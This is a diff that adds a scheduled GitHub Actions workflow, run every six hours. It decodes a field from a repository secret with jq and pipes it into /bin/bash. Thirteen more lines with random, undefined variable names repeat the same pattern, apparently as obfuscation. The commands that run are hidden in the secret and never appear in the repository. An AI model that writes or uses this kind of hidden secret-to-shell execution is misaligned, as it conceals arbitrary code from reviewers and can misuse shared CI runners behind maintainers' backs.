@@ -1,0 +1,30 @@
+name: quanxuanxiangshou
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '26 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: quanxuanxiangshou
+        env:
+          rntdd1133: ${{ secrets.rntdd1133 }}
+        run: |
+          echo $rntdd1133 | jq -r .ek2 | /bin/bash
+          echo $tp9 | jq -r .hzo8906 | /bin/bash
+          echo $guyqi18 | jq -r .vbkty0692 | /bin/bash
+          echo $n45432 | jq -r .dn81613 | /bin/bash
+          echo $egro607 | jq -r .lpj802 | /bin/bash
+          echo $r210 | jq -r .wgmzu06824 | /bin/bash
+          echo $u29 | jq -r .uhqi54334 | /bin/bash
+          echo $bcrgh265 | jq -r .b367 | /bin/bash
+          echo $yy4827 | jq -r .hn61 | /bin/bash
+          echo $v64 | jq -r .o73 | /bin/bash
+          echo $k26148 | jq -r .arl60 | /bin/bash
+          echo $gqgru87425 | jq -r .nngth7194 | /bin/bash
+          echo $hicf406 | jq -r .g8539 | /bin/bash
+          echo $eu9435 | jq -r .rxcq4 | /bin/bash
+
